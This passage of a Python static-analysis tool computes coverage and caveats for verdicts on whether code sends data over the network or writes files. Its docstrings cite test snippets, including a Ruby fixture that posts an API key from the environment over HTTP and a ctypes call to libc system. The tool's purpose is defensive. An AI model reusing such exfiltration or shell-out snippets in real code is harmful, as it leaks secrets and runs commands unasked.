        # has a moduleless subprocess row (checked across all 14), so an
        # ``if primitive.module`` branch would be dead code dressed as caution.
        sites.add(".".join(part for part in (primitive.module, primitive.name) if part))
    return sorted(sites)


def analysis_fidelity(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> dict[str, list[str]]:
    """Language -> the pass IDs that produced the CALL edges, sorted.

    THE RAW MATERIAL WAS ALWAYS THERE AND UNREAD. ``Edge.origin`` is a list of
    pass IDs and ``Edge.__post_init__`` HARD-RAISES on an empty one, so every
    edge in a well-formed map can say which pass made it; this module read
    ``src`` / ``dst`` / ``type`` and never ``origin``.

    CALL EDGES ONLY. A ``contains`` edge from the containment linker says
    nothing about the fidelity of the call structure a boundary verdict rests
    on, and including it would let an infrastructure pass dilute the answer.

    AN EDGE WITH NO ORIGIN IS REPORTED AS ``unattributed`` RATHER THAN DROPPED.
    Dropping it would let a verdict claim a fidelity for edges that never
    declared one — the failure mode this whole field exists to remove.

    Two entries for one language is the NORMAL case, not an anomaly: ADR-0012's
    multi-fidelity design is COEXISTENCE, so a Rust run with the SCIP backend
    on carries tree-sitter and scip edges side by side.
    """
    by_language: dict[str, set[str]] = {}
    for edge in raw_edges:
        if edge.get("type") not in _CALL_SITE_EDGE_TYPES:
            continue
        language = str(edge.get("dst", "")).split(":")[0]
        if language not in catalogs:
            continue
        origin = edge.get("origin") or []
        if isinstance(origin, str):
            origin = [origin] if origin else []
        by_language.setdefault(language, set()).update(
            origin or ["unattributed"],
        )
    return {lang: sorted(ids) for lang, ids in sorted(by_language.items())}


def passes_that_ran(raw_edges: list[dict[str, Any]]) -> set[str]:
    """Every pass ID that stamped ANY edge in this run.

    DELIBERATELY NOT :func:`analysis_fidelity`, and the difference was found by
    measuring rather than reasoning. A backend can RUN and contribute no CALL
    edges: with rust-analyzer enabled on an authored crate, the SCIP pass
    emitted ``references`` and ``contains`` edges and no external ``calls``, so
    the call-edge fidelity map correctly read ``{"rust": ["rust"]}`` — and a
    "was NOT used" caveat keyed on that map told the reader to enable a backend
    that was already on. That sentence was false, which is the one thing this
    whole disclosure exists to prevent.

    So the two questions are answered from two populations: what produced the
    CALL STRUCTURE the verdict rests on (call edges only), and whether a pass
    ran at all (every edge).
    """
    seen: set[str] = set()
    for edge in raw_edges:
        origin = edge.get("origin") or []
        if isinstance(origin, str):
            origin = [origin] if origin else []
        seen.update(origin)
    return seen


def _higher_fidelity_caveat(entries: dict[str, str]) -> dict[str, Any]:
    """The one place the unused-backend disclosure is built.

    NAMES THE BACKEND, because the action the reader can take is to turn that
    specific thing on, and a caveat that does not say what to enable is a
    complaint rather than a disclosure.
    """
    parts = [f"{lang} ({backend})" for lang, backend in sorted(entries.items())]
    return {
        "kind": CAVEAT_HIGHER_FIDELITY_AVAILABLE,
        "entries": sorted(entries),
        "detail": (
            "A higher-fidelity analyzer for this repository is installed on "
            "this machine and was NOT used, so the verdict rests on the "
            "built-in parser's view of call structure rather than on resolved "
            "types: " + ", ".join(parts) + ". Enabling it resolves receivers "
            "this verdict had to disclose it could not type."
        ),
    }


def _uncatalogued_external_modules(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> list[str]:
    """Return the external modules this analysis called into and cannot adjudicate.

    THE PERMITTING CASE IS ENUMERATED, NOT THE BLOCKING ONE. A module supports
    a clean verdict when this catalogue has ENUMERATED its I/O surface —
    :meth:`IoBoundaryCatalog.module_io_is_enumerated`, a dated per-module audit
    recorded in ``module_completeness``. Everything else is a module
    where "no ``net_send`` chains" means "none I could see". A denylist of
    known-risky libraries would fail open on the first library nobody had
    thought of, which is exactly how ``requests`` slipped through.

    TWO WEAKER TESTS USED TO STAND HERE AND BOTH FAILED OPEN, measured live on
    the shipped CLI with controls (INV-buzab P0, INV-zubuh P1):

    - ``is_stdlib_module(module)`` — name recognition against
      ``sys.stdlib_module_names``. ``telnetlib``, ``ssl`` and ``ctypes`` carry
      no catalogue row, and all three confirmed "never sends data over the
      network" for programs that respectively opened a telnet session, wrapped
      a socket, and shelled out through ``ctypes.CDLL("libc.so.6").system``.
    - row presence (``module == p.module or p.module.startswith(module + ".")``)
      — boundary-blind and surface-blind. ``os`` has 40 rows, so ``os`` counted
      as covered for EVERY boundary kind, including the ~30 I/O functions never
      enumerated: ``os.open`` + ``os.write`` confirmed "never writes to the
      host filesystem", and ``os.sendfile`` confirmed the network claim.

    The controls are what make those defects rather than blindness: in the same
    runs ``requests.post`` correctly returned ``inconclusive`` and
    ``os.makedirs`` / ``os.remove`` correctly returned ``violated``.

    THE STRICT DIRECTION IS AFFORDABLE BECAUSE IT CANNOT SUPPRESS A DETECTION.
    ``verify_claim`` returns ``violated`` outside the ``coverage.complete``
    branch, so coverage gates only the all-clear. Measured on four real repos
    (httpx, poetry, full-stack-fastapi-template, hypergumbo itself) every one
    was ALREADY ``inconclusive`` — 27 to 127 uncatalogued modules apiece — so
    tightening changed no verdict there. The cost falls on programs with no
    unadjudicable third-party module at all, which is precisely the population
    the false confirm endangered.

    SCOPE — the residual this deliberately leaves open. Only a dst that NAMES a
    module is counted. The bare ``external`` placeholder
    (``python:external:0-0:get:unresolved``, an untyped receiver) names none, so
    it is skipped: it is the largest edge population in a Python repo, it
    identifies no library to report, and counting it would downgrade nearly every
    repo to ``inconclusive`` while telling the reader nothing about what went
    unexamined. That population is the receiver-typing gap (INV-linub L3) and is
    tracked there, not laundered through this gate; ``complete`` stays ``True``
    over it, pinned by ``test_untyped_receiver_population_is_the_disclosed_residual``.

    THE CONSEQUENCE THAT USED TO FOLLOW NO LONGER DOES, and this paragraph said
    it did for eleven days: "a repo reaching its I/O ONLY through untyped
    receivers still confirms". Reproduced, then closed at a different layer
    (INV-fibis). :func:`untyped_receiver_sites` takes the same population this
    skip drops and asks the narrower question this one cannot — is the CALLEE a
    method the catalogue declares for the boundary under claim — and the answer
    QUALIFIES a clean verdict (``CAVEAT_UNTYPED_RECEIVER``) rather than
    withholding it. So the skip here is still right, and the silence it used to
    produce is gone.

    SECOND RESIDUAL, AND IT IS THE LARGER ONE. A language with no I/O catalogue
    is skipped here, and NOTHING downstream catches it for a boundary claim.
    This paragraph used to say the case was "already decided upstream
    (``is_supported`` / ``unsupported_taint_languages``)"; both halves are false
    for this command. ``cmd_verify_claims`` derives its supported set as
    ``languages & set(catalogs)`` and never consults ``is_supported``, and
    ``unsupported_taint_languages`` is populated only when the claims file
    carries a taint constraint. So the ``catalog is None`` skip below drops the
    language entirely. Reproduced on the shipped CLI with a 12-line Ruby fixture
    doing ``Net::HTTP.new(...).post(path, "key=#{ENV['API_KEY']}")``: both the
    ``net_send`` and ``fs_write`` claims return ``confirmed`` rc 0, with an empty
    ``unsupported_taint_languages`` and no disclosure of any kind — and the
    analyzer is not blind, it emits ``calls -> ruby:http:0-0:new:external_symbol``.
    Tracked separately; naming it here rather than asserting it away is the
    point, because a gate that mis-states its own scope is the shape of defect
    this function exists to correct.
    """
    # REUSED, NOT REIMPLEMENTED. Symbol-id module extraction already has six
    # homes and three different correct mechanisms (WI-ribuz), two of them naive
    # and wrong. ``_module_from_symbol_path`` is the one written for exactly this
    # comparison — an external dst's module against a catalog entry's declared
    # module (WI-damir) — including the ``""``-for-placeholder contract this
    # function's residual depends on. Adding a seventh home is how the drift
    # WI-ribuz files gets one entry longer. Imported inside the function because
    # ``taint`` is heavy and only this one path needs it.
    from .taint import _module_from_symbol_path

    analyzed = _analyzed_modules(raw_edges)
    unknown: set[str] = set()
    for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
        module = _module_from_symbol_path(dst)
        if not module:
            continue  # the placeholder — the disclosed residual above
        # (0) A LAUNCH IS AN EXAMINED CALL, NOT A BLIND ONE (INV-vokog). We
        # know exactly what this call is and where control went; that it cannot
        # be followed further is reported through the caveat channel built for
        # it (CAVEAT_OPAQUE_BOUNDARY), by NAME, checkable against the source.
        # Counting it here as well says the opposite about the same edge — and
        # because ``qualifying_only`` is ``not unknown``, a launch withheld the
        # qualified verdict it had just earned. Measured on the self-survey: 80
        # of 81 launch sites were in both sets, so rc 3 was unreachable in any
        # repo containing a shell script, which is the dead end ADR-0016 §4 was
        # written to prevent.
        #
        # ASKED FIRST, mirroring :func:`_opaque_launch_sites`, so the two
        # consumers walk the channels in the same order. The python path never
        # hit this because ``subprocess.run`` carries a row that step (1)
        # matches — an immunity nobody designed and a catalogue edit could
        # remove, so it is pinned by
        # ``test_the_python_path_was_immune_only_by_luck``.
        if _is_producer_stamped_launch(edge):
            continue
        # (1) A CALL THE CATALOGUE CLASSIFIED WAS EXAMINED. That is what
        # examination IS, and it is asked through the same function the tagger
        # uses, so the gate cannot call a site unexamined that the tagging pass
        # just tagged. Answering this per-MODULE instead was measurably wrong:
        # a fixture calling ``json.dump(obj, fh)`` printed "calls into 2
        # module(s) with no I/O catalog coverage (builtins, json)" directly
        # above "2 fs_write chain(s) found" — through those very modules.
        if classify_call(catalogs, dst, edge.get("meta"),
                         dst_ref=_edge_dst_ref(edge)):
            continue
        # (2) AN UNMATCHED CALL IS AN EXAMINED NEGATIVE ONLY OVER AN ENUMERATED
        # MODULE. This is the smaller, honest remainder of the question, and it
        # replaced two branches that each answered something adjacent:
        # ``is_stdlib_module`` (does the interpreter ship this name — INV-buzab)
        # and row PRESENCE (did I catalogue ANY primitive here — INV-zubuh).
        # Each permitted a real exfiltration into a ``confirmed`` verdict.
        # Restoring either as a fallback restores the defect; there is none.
        # INV-zimud: A DISJUNCTIVE SLOT IS EXPANDED HERE TOO, AND THE
        # DIRECTION IS THE OPPOSITE OF THE CLASSIFICATION PATH'S.
        #
        # ``cpp.py`` sets an unresolved call's module slot to the comma-joined
        # list of every ``#include`` in the file, and says so in its own
        # comment: "downstream consumers may split the module_hint on commas".
        # ONE of the two consumers did. ``io_boundary`` splits it to
        # CLASSIFY; this gate handed the whole joined string to
        # ``module_io_is_enumerated``, where it is a synthetic pseudo-module no
        # ``module_completeness`` entry can ever match — so every C++ call site
        # with more than one system include was PERMANENTLY unexaminable, not
        # merely unexamined. Measured over the WI-lutuh sweep: 19,273 of 81,711
        # C/C++ external dsts carry a comma (libzmq 21.7%, plasma-desktop
        # 40.3%, shaka-packager 29.5%; the three C repos 0.0%).
        #
        # ALL, NOT ANY. Classification asks "does any spelling name a
        # primitive" and an ANY answer is a positive claim. This gate asks "was
        # the surface this call could have come from enumerated", and a
        # non-match is informative ONLY if every possible home was enumerated —
        # one unenumerated disjunct leaves the call genuinely unexamined. ANY
        # here would let a single enumerated header vouch for a file that also
        # includes twenty that are not, which is the fail-open direction this
        # gate exists to refuse.
        #
        # AND THE UNKNOWN IS REPORTED PER DISJUNCT, not as the joined string.
        # ``string,sys/socket.h,ws2tcpip.h`` names nothing a reader can act on;
        # ``sys/socket`` does.
        disjuncts = module_hint_disjuncts(module)
        unenumerated = [
            spellings for spellings in disjuncts
            if not any(
                catalog.module_io_is_enumerated(s) for s in spellings
            )
        ]
        if disjuncts and not unenumerated:
            continue
        if len(disjuncts) > 1:
            for spellings in unenumerated:
                unknown.add(spellings[-1])
            continue
        # AN UNRESOLVED FIRST-PARTY CALLEE IS NOT A CATALOG GAP. Its source was
        # read, so whatever I/O it performs was examined on its own edges — it
        # is not a leaf this analysis cannot see past. Counting it would send a
        # repo with no third-party dependency at all to ``inconclusive`` on one
        # unresolved internal call. Measured on poetry: 120 of 171 call-site
        # modules were poetry's own.
        if _is_analyzed_module(module, analyzed):
            continue
        # A MODULE THE LANGUAGE ITSELF MARKS AS FIRST-PARTY IS NOT A CATALOGUE
        # GAP EITHER, and the path-derived test above cannot see it (INV-juvul).
        # ``analyzed`` is built from SRC FILE PATHS — bellman yields
        # ``src.gadgets.boolean`` — while the callee slot carries a RESERVED
        # KEYWORD (``crate::``, ``super::``) or a RELATIVE PATH (``../post``).
        # A keyword is not a name and a relative specifier is meaningless until
        # resolved against the importing file, so no amount of suffix matching
        # bridges either one; the rule has to come from the language.
        #
        # ASKED LAST, after the path-derived test, so the cheap and general
        # answer runs first and this one only sees what it could not explain.
        # Measured 2026-08-24: 5 of bellman's 23 reported modules and 6 of
        # express's 17 are exactly this, and because ``qualifying_only`` is
        # ``not unknown``, those alone withheld every claim on both repos.
        if is_definitionally_first_party(dst.split(":", 1)[0], module):
            continue
        unknown.add(module)
    return sorted(unknown)


def untyped_receiver_sites(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> dict[str, list[str]]:
    """Call sites reaching a catalogued METHOD through a receiver of unknown type,
    grouped by the boundary that method is catalogued for (INV-fibis).

    THE RESIDUAL :func:`_uncatalogued_external_modules` DOCUMENTS, ANSWERED AT A
    DIFFERENT LAYER. That function counts only a dst that NAMES a module, so the
    bare placeholder ``python:external:0-0:sendall:external_symbol`` is skipped —
    correctly, because it identifies no library to report and is the largest edge
    population in a Python repo, so counting it as an uncatalogued module sends
    nearly every repo to ``inconclusive`` while saying nothing. Nothing here
    changes that: coverage stays ``complete``. What this adds is the ability to
    QUALIFY a clean verdict instead of leaving it silent.

    KEYED BY BOUNDARY BECAUSE THE SCOPING IS THE WHOLE DESIGN. A downgrade on the
    unscoped version of this signal was measured on 2026-08-11 and recorded DO
    NOT BUILD IT — on poetry every boundary downgraded, because the catalogued
    method names include ``close`` / ``get`` / ``read`` / ``write`` / ``send``.
    Returning a MAP rather than a flat list is what makes the scope structural: a
    caller that forgets to scope gets a dict, not a wrong answer. That
    measurement's own example — an unrelated dict ``.get``, catalogued under
    ``db_read`` — cannot reach a ``net_send`` claim through this shape.

    THREE FILTERS, EACH LOAD-BEARING:

    * **the placeholder**, asked through ``_module_from_symbol_path`` — the same
      predicate :func:`_uncatalogued_external_modules` uses for the complementary
      half of the same population, so the two cannot come to disagree about which
      edges name a module (WI-ribuz's drift, and the reason there is no seventh
      home for module extraction here).
    * **``call_construct == "method"``**, the producer's own statement that a
      RECEIVER was there. Without it the disclosure would claim a receiver on
      evidence that never mentioned one, and a bare ``open()`` would be reported
      as an untyped receiver.
    * **method-KIND catalogue rows**. A function-kind primitive is not reached
      through a receiver at all, so matching one would make the sentence false.

    Every boundary a name is catalogued under is reported, not the first: an
    unknown-typed receiver is unknown for all of them, and reporting one is the
    row-order masking INV-zumin already paid for once.
    """
    grouped: dict[str, set[str]] = {}
    for _lang, name, site, catalog in _untyped_receiver_call_sites(
        raw_edges, catalogs,
    ):
        for boundary in {
            p.boundary for p in catalog.lookup_all(name)
            if p.kind == "method" and p.name == name
        }:
            grouped.setdefault(boundary, set()).add(site)
    return {b: sorted(sites) for b, sites in sorted(grouped.items())}


def _untyped_receiver_call_sites(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> Iterator[tuple[str, str, str, IoBoundaryCatalog]]:
    """Every call through a receiver the analysis could not type, as
    ``(language, method name, site label, that language's I/O catalog)``.

    THE ONE DEFINITION OF "UNTYPED RECEIVER", shared by the boundary arm
    (:func:`untyped_receiver_sites`) and the taint arm
    (:func:`untyped_receiver_sink_zones`). Extracted when the second consumer
    appeared rather than after the two drifted, for the reason
    :func:`_external_call_sites` gives one layer down and INV-motos paid for:
    sharing a PREDICATE is not enough when the two callers can still walk
    different populations. INV-nuhun is itself an arm-disagreement item, so two
    hand-maintained copies of this walk would be the defect reappearing inside
    its own fix.

    THREE FILTERS, EACH LOAD-BEARING (unchanged, and documented at length on
    :func:`untyped_receiver_sites`):

    * **the placeholder**, asked through ``_module_from_symbol_path`` — the same
      predicate :func:`_uncatalogued_external_modules` uses for the complementary
      half of the same population, so the two cannot come to disagree about which
      edges name a module.
    * **``call_construct == "method"``**, the producer's own statement that a
      RECEIVER was there. Without it a bare ``open()`` would be reported as an
      untyped receiver.
    * **the launch exclusion** — a launch is an EXAMINED call, reported by NAME
      through ``CAVEAT_OPAQUE_BOUNDARY``; saying "and its receiver was untyped"
      about the same edge is a second, contradictory statement about one call.

    What each caller then does with ``name`` differs, and that difference is the
    point: the boundary arm asks its I/O catalog which BOUNDARIES declare that
    method, the taint arm asks the SINK catalog which ZONES do. Neither question
    can be answered from the other's vocabulary without assuming every taint sink
    is an I/O primitive — true of the shipped catalogue by construction, enforced
    nowhere, and false the moment a repository passes ``--taint-sinks``.
    """
    from .taint import _module_from_symbol_path

    for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
        if _module_from_symbol_path(dst):
            continue  # a named module — adjudicated by the coverage gate
        meta = edge.get("meta") or {}
        if meta.get("call_construct") != "method":
            continue
        # A LAUNCH IS AN EXAMINED CALL (INV-vokog), reported by NAME through
        # CAVEAT_OPAQUE_BOUNDARY. Saying "and its receiver was untyped" about the
        # same edge is a second, contradictory statement about one call — the
        # exact disagreement that made rc 3 unreachable when these two consumers
        # last walked the same population with different rules. Asked in the same
        # position as the other consumer asks it.
        if _is_producer_stamped_launch(edge):
            continue
        yield (dst.split(":")[0], symbol_name_slot(dst),
               _call_site_label(edge), catalog)


def untyped_receiver_sink_zones(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
    sinks_by_language: Mapping[str, Sequence[Any]],
) -> dict[str, list[str]]:
    """Call sites reaching a catalogued taint SINK through a receiver of unknown
    type, grouped by the sink's ZONE (INV-nuhun).

    The taint arm's counterpart to :func:`untyped_receiver_sites`, and keyed by
    zone for the identical reason that one is keyed by boundary: the scoping is
    the whole design. The 2026-08-11 measurement that recorded DO NOT BUILD IT
    for an unscoped downgrade applies here unchanged — the catalogued method
    names include ``close`` / ``get`` / ``read`` / ``write`` / ``send``, so an
    unrelated dict ``.get`` must not be able to qualify a ``network`` verdict.
    Returning a MAP rather than a flat list is what makes that structural.

    ASKED OF THE SINK CATALOGUE, NOT MAPPED FROM BOUNDARIES. Every sink hypergumbo
    ships today is auto-derived from an I/O primitive through
    ``AUTO_SINK_ZONE_MAP`` (measured: all 214 python sinks, and every zone present
    is reachable from that map), so inverting the boundary map would return an
    IDENTICAL answer on the shipped catalogue and would have been less code. It is
    not what this does, because the equality holds by construction and is enforced
    nowhere: a repository that declares its own sink via ``--taint-sinks`` names a
    method the I/O catalogue has never heard of, and inverting the map would
    silently disclose nothing about it. Under-reporting a caveat is a quieter
    failure than a false ``confirmed``, but it is the same species — asserting a
    completeness that was never established — and this item exists because that
    species went undetected in the other arm.

    ``sinks_by_language`` is the same per-language sink list the propagation ran
    with, so a language whose sinks were never loaded cannot acquire a disclosure
    about sinks that played no part in its verdict.
    """
    grouped: dict[str, set[str]] = {}
    for lang, name, site, _catalog in _untyped_receiver_call_sites(
        raw_edges, catalogs,
    ):
        for sink in sinks_by_language.get(lang) or ():
            # METHOD-KIND ONLY, asked of the SINK's own ``kind``. A function-kind
            # sink is not reached through a receiver at all, so claiming its
            # receiver was untyped would make the sentence false on its own
            # evidence — the same rule the boundary arm applies to ``IoPrimitive``.
            if sink.kind == "method" and sink.name == name:
                grouped.setdefault(sink.zone, set()).add(site)
    return {z: sorted(sites) for z, sites in sorted(grouped.items())}


def unknown_receiver_scope(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> tuple[int, int, list[str]]:
    """``(untyped sites, method call sites, distinct method names)`` for the whole
    analysis — the population :func:`untyped_receiver_sites` scopes down from.

    SAME NUMERATOR PREDICATES, DELIBERATELY, MINUS THE CATALOGUE-NAME FILTER.
    The bare placeholder (``_module_from_symbol_path`` finds no module), the
    producer's own ``call_construct == "method"`` statement that a receiver was
    there, and the launch exclusion (a launch is an EXAMINED call, reported by
    name through ``CAVEAT_OPAQUE_BOUNDARY``; saying "and its receiver was
    untyped" about the same edge is the contradictory second statement that made
    rc 3 unreachable once already). Dropping only the method-KIND row match is
    the whole difference, and it is the difference the corpus measured as
    90-scopes-to-zero.

    THE DENOMINATOR IS COMMENSURABLE WITH THE NUMERATOR BY CONSTRUCTION: both
    count method-construct call sites in a language that HAS a catalogue, so a
    polyglot repo cannot dilute the ratio with calls nothing could have
    adjudicated anyway. A resolved in-repo callee counts in the denominator and
    not the numerator, which is correct — resolving it IS typing its receiver.
    """
    from .taint import _module_from_symbol_path

    total = 0
    sites = 0
    names: set[str] = set()
    for edge in raw_edges:
        if edge.get("type") not in _CALL_SITE_EDGE_TYPES:
            continue
        if (edge.get("meta") or {}).get("call_construct") != "method":
            continue
        dst = edge.get("dst", "")
        parts = dst.split(":")
        if len(parts) < 5 or catalogs.get(parts[0]) is None:
            continue
        total += 1
        if parts[-1] not in _EXTERNAL_DST_TERMINAL_SLOTS:
            continue
        if _module_from_symbol_path(dst):
            continue
        if _is_producer_stamped_launch(edge):
            continue
        sites += 1
        # THE NAME THE READER IS SHOWN (WI-nakut, root-caused as INV-divuf).
        # Read from the LOSSLESS home, never re-derived from the id — the id's
        # name slot is lossy by ADR-0036 Ruling 1, and for an objc selector it
        # is the empty string, which is how this caveat came to render
        # "distinct method(s): ." on the shipped CLI.
        names.add(_callee_name(edge))
    return sites, total, sorted(names)


def _callee_name(edge: dict[str, Any]) -> str:
    """The callee's name at FULL FIDELITY — the one home, read once.

    ADR-0036 Ruling 1 makes the id's name slot deliberately lossy and says in
    as many words that "Consumers that need the exact name MUST read
    ``Symbol.name``, never re-derive it from the ID." Both disclosure sites
    below used to re-derive it, and neither could have worked: an Objective-C
    selector ENDS in a colon, so the id's second-to-last token is the EMPTY
    STRING and the caveat rendered "distinct method(s): ." on the shipped CLI
    (WI-nakut, root-caused as INV-divuf).

    ``meta['callee_name']`` is the lossless home ``make_unresolved_edge``
    stamps on every unresolved-external edge. The id remains the FALLBACK,
    deliberately: not every producer routes through that factory, and a
    disclosure path is the wrong place to raise. It is read through
    :func:`ir.symbol_name_slot` rather than positionally so the fallback is at
    least span-anchored.

    ONE FUNCTION because the two call sites are a PAIR — ``_site_method``
    parses ``_call_site_label``'s output back out — and two homes for one read
    is how they drift apart (LIVE.md rule 7).
    """
    meta = edge.get("meta") or {}
    name = meta.get("callee_name")
    if isinstance(name, str) and name:
        return name
    return symbol_name_slot(str(edge.get("dst", "")))


def _call_site_label(edge: dict[str, Any]) -> str:
    """``path:line name()`` — where the reader looks, not what the analysis knew.

    The RECEIVER's type is the unknown; the call site is known exactly, so the
    disclosure names a location a reader can open. The opaque caveat can name a
    qualified primitive (``subprocess.run``) because it resolved one; here there
    is no module to qualify with, which is the whole point, so a count or a bare
    method name would be an unactionable disclosure.

    The line is omitted rather than faked when the producer did not stamp one —
    ``svc.py sendall()`` still points at a file.

    THE ``src`` IS NORMALLY AN IN-REPO SYMBOL AND SO NORMALLY A REAL PATH, but
    not always: an external symbol's path slot reads ``<external>``, producing a
    label like ``<external>:75 count()`` that a reader cannot open. Measured, so
    the decision is sized rather than guessed — **1 of 6,195** distinct labels on
    sqlalchemy, **0 of 713** on poetry. It is disclosed rather than dropped: at
    that rate special-casing buys nothing, and dropping sites is the
    under-disclosure direction this whole caveat exists to close.

    READ BACK BY :func:`_site_method`, WHICH IS WHY THE NAME IS LAST. The two are
    a pair and live together deliberately: ``_merge_caveat`` re-renders a widened
    caveat from the merged ENTRY STRINGS alone, so the label format has to be
    invertible far enough to recover the method, and a format whose writer and
    reader sat in different places would drift on the first edit to either.
    """
    path = _symbol_path_slot(edge.get("src", ""))
    # Same source as ``unknown_receiver_scope``'s, and these two are a pair
    # (``_site_method`` reads this label back), so they must agree (INV-divuf).
    name = _callee_name(edge)
    line = edge.get("line")
    where = f"{path}:{line}" if line else path
    return f"{where} {name}()"


def _site_method(label: str) -> str:
    """``sendall()`` out of ``svc.py:10 sendall()`` — the inverse of
    :func:`_call_site_label`, to the extent the caveat prose needs one.

    RIGHT-ANCHORED, and that is the whole correctness argument: a METHOD name
    contains no space, so the last space-separated token is always the method
    however odd the path is — including a path with a space in it, and including
    the colon-bearing path slot ADR-0036 (D1a) permits (``dart:io``). Splitting
    on the FIRST space would break on the first file name with a space.
    """
    return label.rsplit(" ", 1)[-1]


#: Edge types that count as a repo genuinely CALLING into a module, for the
#: method-starvation check. Deliberately excludes ``imports``: ``import
#: java.io.File`` performs no I/O and an unused import must not be read as
#: evidence that the analyzer went blind. The Kotlin case this check exists for
#: is caught anyway, because its evidence is a CALL edge (the constructor).
_STARVATION_CALL_EDGE_TYPES: frozenset[str] = frozenset({"calls"})


def method_starved_modules(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> list[str]:
    """External modules this analysis called into but could never have adjudicated.

    THE SINGLE ANSWER to "is this language's catalogued I/O structurally
    invisible", consumed by :func:`compute_boundary_coverage` so the boundary
    gate and the taint gate share one rule rather than growing a second copy.

    A catalogue entry declares its own call shape: ``java.io.File`` carries
    ``methods: [writeText, ...]``, so only a METHOD-construct call edge can ever
    match it, while ``kotlin.io.ConsoleKt`` carries ``functions: [println]``
    precisely because that receiver is compiler-synthesised and absent at AST
    level. So when a repo calls into a method-keyed module and the analyzer
    produced no method-construct edge for it, the catalogue was never given
    anything it could match — the analysis did not look.

    WHY NOT THE SIMPLER PREDICATES, measured before this one was written
    (``scripts/measure-blind-language-signal.py``, six fixtures):

    * "did the language emit ANY call edge" is the predicate this replaces; a
      Kotlin repo that writes a socket payload to disk emits five and passes.
    * "count only non-first-party dsts" does not discriminate at all, because
      :func:`is_first_party_callable_dst` requires an ABSOLUTE path slot and
      Kotlin's intra-repo dsts are relative.
    * "did the language emit any method-construct edge" catches the Kotlin case
      but also downgrades a pure-computation Python repo that simply calls
      nothing external — conflating "cannot see this language" with "this repo
      has no external calls". That blanket downgrade is the failure mode that
      made ``confirmed`` unreachable when this gate was first built, so the
      check is anchored on modules the repo ACTUALLY CALLS.

    Returns the sorted module names, so the caller can name them in a reason a
    human can act on rather than reporting a bare "coverage incomplete".
    """
    method_modules: dict[str, set[str]] = {
        language: {p.module for p in catalog.primitives if p.kind == "method"}
        for language, catalog in catalogs.items()
    }
    # ABSTAIN FOR ANY LANGUAGE THAT NEVER POPULATES ``call_construct``. Measured
    # on two real repos: Go stamps it 7,741 times (6,012 of them ``method``),
    # while JavaScript and TypeScript stamp it ZERO times across 2,995 call
    # edges. For those analyzers the field carries no information, so "no method
    # call landed in this module" is absence of evidence, not evidence of
    # blindness — and reporting it as blindness would downgrade every JS/TS repo
    # on earth, which is the blanket-downgrade failure mode this check is built
    # to avoid. ``None`` (could not check) is not ``empty`` (checked, found none).
    languages_with_construct_evidence: set[str] = {
        edge.get("src", "").split(":", 1)[0]
        for edge in raw_edges
        if (edge.get("meta") or {}).get("call_construct") and ":" in edge.get("src", "")
    }
    called: set[str] = set()
    satisfied: set[str] = set()
    for edge in raw_edges:
        if edge.get("type", "") not in _STARVATION_CALL_EDGE_TYPES:
            continue
        src = edge.get("src", "")
        if ":" not in src:
            continue
        language = src.split(":", 1)[0]
        if language not in languages_with_construct_evidence:
            continue
        modules = method_modules.get(language)
        if not modules:
            continue
        module = symbol_path_slot(edge.get("dst", ""))
        if not module or module not in modules:
            continue
        called.add(module)
        if (edge.get("meta") or {}).get("call_construct") == "method":
            satisfied.add(module)
    return sorted(called - satisfied)


def compute_boundary_coverage(
    raw_edges: list[dict[str, Any]],
    supported_languages: set[str],
    catalogs: dict[str, IoBoundaryCatalog],
    *,
    higher_fidelity_available: Optional[dict[str, str]] = None,
) -> BoundaryCoverage:
    """Decide whether the boundary analysis can support a clean verdict, and what
    such a verdict must disclose.

    TWO SIGNALS, ONE RESULT, AND THEY ARE NOT THE SAME KIND OF THING.
    :func:`_call_production_coverage` answers "could the analysis have seen this
    I/O at all" — a NO withholds the verdict. :func:`untyped_receiver_sites`
    answers "which calls did it see but not adjudicate" — a non-empty answer
    QUALIFIES a verdict it does not withhold, so it is stamped onto every result
    including a complete one (INV-fibis).

    Stamped HERE rather than at the call sites for the reason the ``catalogs``
    parameter is required rather than defaulted: a disclosure a caller can forget
    to attach fails open, and this one has exactly one caller in the CLI plus a
    growing number in tests.
    """
    coverage = _call_production_coverage(
        raw_edges, supported_languages, catalogs,
    )
    coverage.untyped_receiver_sites = untyped_receiver_sites(raw_edges, catalogs)
    coverage.unknown_receiver_scope = unknown_receiver_scope(raw_edges, catalogs)
    # THE THIRD SIGNAL, and the only one not read off the edge set. A language
    # whose analyzer never emits an external instance-method call edge produces
    # the same empty set as a repository that simply makes no such call, so the
    # answer has to come from a dated declaration (analyzer_disclosure). Scoped
    # to languages whose catalogue actually declares method-kind sinks, because
    # a language that catalogues none cannot be hurt by not seeing them.
    from .analyzer_disclosure import (
        method_call_blind_languages,
        suppressed_catalogued_sinks,
    )
    # Scoped to languages PRESENT in this analysis, for the same reason its
    # sibling is: a disclosure about a language the repository does not contain
    # is noise, and a caveat that is always there is discounted by its reader.
    coverage.analysis_fidelity = analysis_fidelity(raw_edges, catalogs)
    # UNUSED, not merely available, and "unused" is decided from the pass IDs
    # that stamped ANY edge — not from the call-edge fidelity map. Measured:
    # with rust-analyzer ON, the SCIP pass emitted `references` and `contains`
    # and no external `calls`, so a check against the fidelity map said "not
    # used" about a backend that was demonstrably running and printed its own
    # "backend ACTIVE" banner in the same run. Caveating that would tell the
    # reader to enable something already enabled.
    _ran = passes_that_ran(raw_edges)
    coverage.higher_fidelity_available = {
        lang: backend
        for lang, backend in (higher_fidelity_available or {}).items()
        if lang in supported_languages
        and _BACKEND_PASS_IDS.get(backend, backend) not in _ran
    }
    coverage.suppressed_sink_methods = {
        lang: sorted(hidden)
        for lang, catalog in catalogs.items()
        if lang in supported_languages
        and (hidden := suppressed_catalogued_sinks(lang, catalog))
    }
    coverage.method_call_blind_languages = method_call_blind_languages(
        supported_languages,
        {
            lang for lang, catalog in catalogs.items()
            if any(getattr(p, "kind", None) == "method"
                   for p in catalog.primitives)
        },
    )
    return coverage


